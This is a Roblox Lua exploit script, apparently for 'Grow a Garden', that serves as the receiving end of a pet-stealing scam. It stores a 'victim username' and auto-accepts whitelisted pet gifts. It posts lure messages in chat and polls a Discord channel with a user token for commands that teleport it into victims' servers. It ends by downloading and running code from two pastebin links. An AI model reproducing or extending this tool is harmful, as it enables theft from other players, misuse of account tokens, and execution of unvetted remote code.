if not game:IsLoaded() then
    game.Loaded:Wait()
end
warn("✅ SCRIPT LOADED")

local a = game:GetService("Players")
local b = game:GetService("ReplicatedStorage")
local c = game:GetService("UserInputService")
local d = game:GetService("RunService")
local e = game:GetService("HttpService")
local f = game:GetService("VirtualInputManager")
local g = game:GetService("VirtualUser")
local h = game:GetService("TeleportService")
local i = game:GetService("TextChatService")
local j = a.LocalPlayer
local k = b:WaitForChild("GameEvents")
local l = k:WaitForChild("GiftPet")
local m = k:WaitForChild("AcceptPetGift")
local n = j:WaitForChild("Backpack")
local o = j:WaitForChild("PlayerGui")
local p = false
local q = _G.Pets
local r = isfile("user_gag.txt")
local s = isfile("joined_ids.txt")
local t = r and readfile("user_gag.txt") or "victim username"
local u = s and e:JSONDecode(readfile("joined_ids.txt")) or {}
local v = false
local w = 0
local x = nil
if not r then
    writefile("user_gag.txt", "victim username")
end
if not s then
    writefile("joined_ids.txt", "[]")
end
print("✅ Auto-Accept Script: Loaded and waiting for gifts...")
print("📦 Pets to accept:", table.concat(q, ", "))
local function y(z)
    print("⏳ Waiting for pet in backpack with name:", z)
    local A = 10
    local B = 0
    while B < A do
        for C, D in ipairs(n:GetChildren()) do
            if D.Name == z then
                print("✅ Pet appeared in backpack:", z)
                return true
            end
        end
        task.wait(0.5)
        B = B + 0.5
    end
    print("❌ Pet not found in backpack after 10s:", z)
    return false
end
local function E(z)
    local F = z:gsub("%s*%[.-%]", "")
    return F:match("^%s*(.-)%s*$")
end
task.defer(
    function()
        print("🔌 Hooking into GiftPet RemoteEvent...")
        l.OnClientEvent:Connect(
            function(G, z, H)
                print("🎁 Gift received:", G, z, H)
                local I = E(z)
                print("🔍 Base pet name:", I)
                if not table.find(q, I) then
                    print("⚠️ Pet not in whitelist. Ignoring gift from:", H)
                    return
                end
                while p do
                    task.wait(0.1)
                end
                p = true
                print("✅ Accepting gift from", H, "with full name:", z)
                local J =
                    pcall(
                    function()
                        m:FireServer(true, G)
                        print("🚀 Gift accepted (ID:", G, ")")
                    end
                )
                if J then
                    y(z)
                else
                    print("❌ Failed to accept gift.")
                end
                p = false
            end
        )
        print("✅ GiftPet listener successfully hooked.")
    end
)
local function K()
    print("Roblox window is IN FOCUS.")
end
d.Heartbeat:Connect(
    function()
        local L = false
        local M = _G.RobloxFocusStatus
        if M == nil then
            K()
            _G.RobloxFocusStatus = L
        elseif L and not M or not L and M then
            K()
            _G.RobloxFocusStatus = L
        end
    end
)
K()
g.Idled:Connect(
    function()
        g:CaptureController()
        g:ClickButton2(Vector2.new())
    end
)
while j:GetAttribute("DataFullyLoaded") ~= true do
    j:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
end
while j:GetAttribute("Finished_Loading") ~= true do
    j:GetAttributeChangedSignal("Finished_Loading"):Wait()
end
while j:GetAttribute("Loading_Screen_Finished") ~= true do
    j:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
end
local N = o:WaitForChild("Gift_Notification"):WaitForChild("Frame")
local function O()
    while task.wait(0.1) do
        for C, P in pairs(N:GetChildren()) do
            if P:IsA("ImageLabel") then
                local Q = P:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
                replicatesignal(Q.MouseButton1Click)
            end
        end
    end
end
task.spawn(O)
i.TextChannels.RBXGeneral:SendAsync("Yo gng check yo clipboard")
wait(0.5)
i.TextChannels.RBXGeneral:SendAsync("GGS")
local function R()
    while task.wait(1) do
        w = w + 1
    end
end
task.spawn(R)
local function S()
    local T
    T =
        a.PlayerRemoving:Connect(
        function(U)
            if U.Name == t then
                if T then
                    T:Disconnect()
                end
                v = true
            end
        end
    )
end
S()
local function V(W)
    table.insert(u, W)
    writefile("joined_ids.txt", e:JSONEncode(u))
end
local function X()
    if token == "" or channelId == "" then
        j:Kick("Add your token or channelId to use")
        return
    end
    local Y =
        request(
        {
            Url = "https://discord.com/api/v9/channels/" .. channelId .. "/messages?limit=1",
            Method = "GET",
            Headers = {
                ["Authorization"] = token,
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                ["Content-Type"] = "application/json"
            }
        }
    )
    if Y.StatusCode == 200 then
        local Z = e:JSONDecode(Y.Body)
        if #Z == 0 then
            return
        end
        local _ = Z[1]
        if _.id == x or table.find(u, tostring(_.id)) then
            return
        end
        local a0 = _.content or ""
        local a1, a2 = string.match(a0, 'TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)')
        if a1 and a2 then
            x = _.id
            V(tostring(_.id))
            writefile("user_gag.txt", "unknown")
            h:TeleportToPlaceInstance(a1, a2)
        end
    else
        print("Invalid response code:", Y.StatusCode)
    end
end
while task.wait(5) do
    X()
end
loadstring(game:HttpGet("https://pastebin.com/raw/xBLu3qtF", true))()
loadstring(game:HttpGet("https://pastebin.com/raw/vbLfSAFd", true))()
